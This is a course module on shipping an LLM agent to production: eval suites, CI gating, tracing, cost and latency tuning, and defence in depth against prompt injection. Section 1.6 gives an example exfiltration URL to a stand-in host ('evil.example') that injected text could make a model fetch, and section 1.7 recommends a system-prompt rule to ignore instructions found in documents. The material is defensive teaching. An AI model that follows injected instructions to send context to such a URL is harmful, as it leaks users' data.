---
title: "Week 4 — Production, Evals & Safety"
track: "ai"
week: 4
order: 4
type: "module"
hours: 20
summary: "Offline and online evals, tracing and observability, caching, cost and latency tuning, prompt-injection defence, guardrails, and shipping it."
tags: ["evals", "observability", "cost", "latency", "security", "prompt-injection", "deployment"]
---

# Week 4 — Production, Evals & Safety

**Goal by Friday:** your Week 2–3 system runs in production with tracing, a graded eval suite
that runs in CI, a cost alarm, a documented threat model, and a README containing real
before/after numbers.

This is the week that separates "I built an AI demo" from "I shipped an AI product".

---

## 1. Concepts (1.5 h)

### 1.1 Evals are the deliverable, not the feature

An AI feature without an eval is an untested feature that changes behaviour every time you
touch a prompt. Your eval suite is the **test suite** for a nondeterministic component, and
it is the only thing standing between you and a silent regression on a Friday.

Three flavours:

| Type | What it is | Cost | When |
| --- | --- | --- | --- |
| **Golden set** (offline) | 30–200 hand-labelled cases, run on every change | $$ | Every PR. The backbone. |
| **LLM-as-judge** | A model grades output against a rubric | $$$ | Large sweeps, subjective quality |
| **Online / production** | Real traffic signals: thumbs, task success, escalation rate | $ | Continuous, after deploy |

**Start with the golden set.** 30 cases, hand-written, with an expected answer and an
acceptable-variation rule. That is enough to catch 80 % of regressions.

### 1.2 Writing cases that are actually useful

```python
Case = {
    "id": "billing_double_charge",
    "input": "I was charged twice for June, card ending 4412",
    "expected": {"category": "billing", "urgency": "high", "needs_human": True},
    "assertions": [                       # graded, not string-compared
        lambda r: r.category == "billing",
        lambda r: r.needs_human is True,
    ],
    "notes": "Was regression #3 — we had 0.9 accuracy but missed every escalation case.",
}
```

**Anti-patterns:**
- Only happy paths. (Your bug is always the unhappy path.)
- Asserting on exact prose. (Over-constrains; you'll "fix" the prompt forever.)
- A set that only tests one component. (Retrieval and generation fail differently.)

**Judge rubric, when you need one** — never "rate 1–10":

```python
JUDGE = """Grade the ANSWER against the SOURCE on:
1. FACTUAL — every claim supported by the source? (pass/fail)
2. COMPLETE — does it answer what was asked? (pass/fail)
3. CITED — is each claim followed by a [Sn] marker? (pass/fail)
Output JSON: {"factual": bool, "complete": bool, "cited": bool}"""
```

Use pass/fail per dimension. A 1–10 score is noise; three booleans are actionable.

### 1.3 Observability: traces, not logs

One trace per request, one span per step. The fields that matter:

```
trace_id, user_hash, model, temperature, max_tokens
prompt_tokens, completion_tokens, cost_usd, ttft_ms, total_ms
retrieved_doc_ids, retrieval_scores, tool_calls[], finish_reason
feedback (thumbs / task success), eval_version
```

That last block is what turns "it felt worse" into "chunking change on Tue dropped
faithfulness 0.91 → 0.83". Tooling worth knowing: Langfuse, Helicone, Braintrust, Arize
Phoenix, or plain OpenTelemetry. **Pick one in the first hour of this week** — retrofitting
traces into an untraced system is a miserable afternoon.

### 1.4 Cost control, ranked by leverage

1. **Prompt caching** — put the large static block (system prompt, long docs, few-shot
   examples) *first* and mark it cacheable. Often 50–90 % cheaper on the input side.
2. **Cache responses** — exact/semantic cache keyed on (model, normalised prompt, context
   version). Semantic cache is a small embedding lookup. Include a TTL.
3. **Route by difficulty** — cheap model for classification/extraction, strong model for
   hard reasoning. A two-tier router pays for itself in a week.
4. **Shrink the context** — retrieve k=4 not k=20; summarise old turns; drop chatty
   instructions that do not change behaviour.
5. **Cap `max_tokens`** — always, everywhere.
6. **Batch** — for offline jobs, 50 % cheaper with async batch APIs.

```python
# Prompt caching: stable prefix first, volatile suffix last
messages = [
    {"role": "system", "content": SYSTEM_PROMPT},            # long, stable → cached
    {"role": "system", "content": few_shot_examples},        # stable → cached
    {"role": "user", "content": f"{retrieved_context}\n\nQ: {question}"},  # volatile
]
```

### 1.5 Latency budget

```
TTFT (time to first token)  ≈ queue + prefill(tokens) + network
Total latency                ≈ TTFT + decode_rate × output_tokens
```

Levers, in order: **stream** (TTFT is a UX win even if total is unchanged) → **reduce
output tokens** (decode dominates: 1,000 output tokens ≈ several seconds) → **prompt
caching** (kills prefill on cache hit) → **run independent calls in parallel** (two RAG
queries + a classifier in one `asyncio.gather`) → **cache**.

**The single best latency fix in most apps:** do not call the model at all for 40 % of
traffic. Cheap rules first, model as fallback.

### 1.6 Security: prompt injection, data exfiltration, and tool abuse

**Prompt injection is not solved.** Assume the model can be convinced to ignore its
instructions. Do not rely on a warning in the system prompt — that is security theatre.

Defence in depth:

1. **Separate trust from instructions.** User text and retrieved documents are **data**, put
   in clearly delimited user turns, never concatenated into the system prompt.
2. **Never let the model authorise its own actions.** A tool that refunds money, sends
   email, or writes to the DB requires a **deterministic policy check in your code**.
3. **Allow-list tools and arguments**; reject anything not declared.
4. **Scope credentials down.** The agent's DB user has read-only access. Least privilege
   applies to agents too.
5. **Output validation at the trust boundary** — treat model output exactly as you treat
   user input in 2015: untrusted until parsed, validated, and escaped.
6. **Human-in-the-loop for irreversible actions** — approval before it ships.
7. **PII scrubbing** in and out; log the hash, not the payload.
8. **Rate limits + per-user token budgets**, because a prompt-injected loop is also a
   billing attack.

```python
def refund(order_id: str, amount: float, *, approved_by_human: bool) -> str:
    if not approved_by_human:                    # policy lives HERE, not in the prompt
        raise PermissionError("refunds require human approval")
    if amount > 500:
        raise PermissionError("refunds over $500 require a supervisor")
    return payments.refund(order_id, amount)
```

Also: **data exfiltration** — untrusted text can instruct the model to fetch `https://evil
.example/?data=<your_context>`. Defend with URL allow-lists on any tool that can reach the
network, and never let the model pass a URL to a fetch tool without validation.

### 1.7 Guardrails in the right order

1. **Input validation** (size, type, rate limit) — cheapest, catches most abuse.
2. **Retrieval filtering** (tenant/ACL filters applied *before* ranking — never let the
   model decide access).
3. **System-prompt instructions** to refuse, stay grounded, and ignore instructions found
   in documents. Helpful, **not** sufficient.
4. **Output validation** — schema, regex, profanity/PII filters, link allow-lists.
5. **Human review** for high-stakes flows.
6. **Monitoring** — log refusals and anomalies; alert on volume spikes.

---

## 2. Lab — take `agent-desk` to production (the week's main build)

### 2.1 The eval harness (`evals/run.py`)

```python
import json, statistics, pathlib

def run_suite(fn, cases: list[dict]) -> dict:
    results = []
    for c in cases:
        try:
            out = fn(c["input"])
            passed = all(a(out) for a in c["assertions"])
        except Exception as e:
            out, passed = {"error": repr(e)}, False
        results.append({"id": c["id"], "passed": passed, "output": out})

    by_tag: dict[str, list[bool]] = {}
    for c, r in zip(cases, results):
        for t in c.get("tags", ["general"]):
            by_tag.setdefault(t, []).append(r["passed"])

    return {
        "accuracy": statistics.mean(r["passed"] for r in results),
        "by_tag": {t: statistics.mean(v) for t, v in by_tag.items()},
        "failures": [r for r in results if not r["passed"]],
    }
```

**Slice by tag.** A suite reporting 0.88 overall but 0.31 on `escalation` is not an 0.88
suite — it is a broken safety path wearing a good average. Always report the worst slice.

### 2.2 Gate it in CI (`.github/workflows/evals.yml`)

```yaml
name: evals
on: [pull_request]
jobs:
  eval:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: '3.11' }
      - run: pip install -r requirements.txt
      - run: python -m evals.run --cases evals/cases.json --min-accuracy 0.85
```

Fail the build below your threshold. This is the single highest-leverage engineering habit
in AI development: **no prompt change ships without moving a measured number.**

### 2.3 Trace every request (`observability.py`)

```python
from contextlib import contextmanager
import time, uuid

@contextmanager
def trace(name: str, **meta):
    span = {"id": uuid.uuid4().hex[:12], "name": name, "start": time.perf_counter(), **meta}
    try:
        yield span
    finally:
        span["ms"] = round((time.perf_counter() - span["start"]) * 1000, 1)
        SPANS.append(span)                      # swap for your OTLP/Langfuse exporter

def instrumented_answer(question: str) -> dict:
    with trace("answer", question_hash=hashlib.sha256(question.encode()).hexdigest()[:8]) as t:
        with trace("retrieve") as r:
            chunks = retriever.search(question)
        with trace("generate") as g:
            g["prompt_tokens"] = USAGE.prompt
            reply = chat(build_prompt(question, chunks))
        t["cost_usd"] = USAGE.cost()
        t["doc_ids"] = [c["id"] for c in chunks]
        return {"reply": reply, "citations": [c["meta"] for c in chunks]}
```

Then a `GET /traces/{id}` endpoint and a `/traces` HTML dump. Watching real traces of your
own agent is worth a full afternoon of guesswork.

### 2.4 Cost guardrail (`budget.py`)

```python
class BudgetExceeded(Exception): ...

class BudgetGuard:
    def __init__(self, usd: float):
        self.limit, self.spent = usd, 0.0

    def check(self, est_next_cost: float) -> None:
        if self.spent + est_next_cost > self.limit:
            raise BudgetExceeded(f"per-request budget {self.limit} exhausted")
        self.spent += est_next_cost
```

Wire it into the agent loop, add a daily org-level cap, and page someone when a single
request costs more than 20× the p95. A runaway agent loop is an outage you will pay for.

### 2.5 Ship it

```python
# FastAPI: two endpoints, honestly implemented
@app.post("/api/answer")
def answer(req: AskRequest, user=Depends(current_user)):
    with tracer.start("request") as span:
        guard = BudgetGuard(usd=0.10)
        return answer_service(req.question, user=user, guard=guard)
```

Plus: a real rate limiter, structured logging, a `/healthz`, and a Dockerfile.

---

## 3. Practical drills (3 h)

| # | Drill | Teaches |
| --- | --- | --- |
| 1 | Break one prompt on purpose; run CI; watch it go red | Evals catch what you cannot see |
| 2 | Slice results by tag; find your worst category | Averages hide failures |
| 3 | Enable prompt caching; record the cost delta on 100 calls | Largest single cost lever |
| 4 | Add a semantic cache; measure hit rate and staleness risk | Cache invalidation still exists |
| 5 | Route classification to the cheap model; compare accuracy/cost | Two-tier routing pays off |
| 6 | Run 20 requests; plot TTFT and total latency | Where the seconds actually go |
| 7 | Red-team your own agent with 15 injection attempts | Defence in depth is real |
| 8 | Kill the API key mid-run; verify the fallback path | Failure modes on demand |

---

## 4. Deliverable — production `agent-desk` on GitHub

- [ ] Golden eval set: ≥ 50 cases, tagged, with a written threshold and CI gating
- [ ] Per-tag report and a failure list you have actually read and fixed
- [ ] Tracing (or OTLP) with token/cost/latency per span
- [ ] Prompt caching + one other cost optimisation, with before/after numbers
- [ ] Cost budget guard + daily cap + alert
- [ ] Threat model doc: trust boundaries, attack, mitigation — one page
- [ ] Rate limiting, input validation, human approval on the irreversible action
- [ ] Dockerfile + deploy; `README.md` with the numbers table

**The numbers table is the whole point of this week:**

| change | accuracy | faithfulness | p95 latency | $/1k requests |
| --- | --- | --- | --- | --- |
| baseline | 0.62 | 0.71 | 3,400 ms | $1.90 |
| + chunk headers | 0.71 | 0.79 | 3,450 ms | $1.90 |
| + hybrid + rerank | 0.81 | 0.88 | 4,100 ms | $1.90 |
| + prompt caching | 0.81 | 0.88 | 2,200 ms | $0.74 |
| + router (cheap tier) | 0.80 | 0.87 | 1,900 ms | $0.31 |

---

## 5. Self-check

1. What is your worst eval slice, and what are you doing about it?
2. Prompt injection got past your system prompt. Which three layers stopped it?
3. Where does your policy check for a destructive action live, and why not in the prompt?
4. Latency is 3.2 s. Where do you look first, and what is the one change with the best ratio?
5. Your semantic cache serves a 6-day-old pricing answer. What key/version would have
   prevented that?
6. Write the 30-second pitch for this system, using a number from your table.

---

## 6. Cheat sheet

| Problem | First move | Then |
| --- | --- | --- |
| Quality dropped after a change | Run the golden suite, slice by tag | Fix the failing slice, re-run |
| Bill too high | Add prompt caching | Route to a cheap model; shrink context |
| Feels slow | Stream the response | Cut output tokens; parallelise calls |
| Same question asked often | Response cache + TTL | Batch offline work |
| Hallucinations returned | Strengthen refusal + retrieval threshold | Output validation; ground with citations |
| Injection succeeded | Move policy out of the prompt | Allow-list tools, scope credentials, HITL |
| Agent loops | Step + cost budget, fingerprint dedupe | Narrow the tool set |
| Cannot debug a bad answer | Read the trace | Compare retrieved chunk IDs across runs |
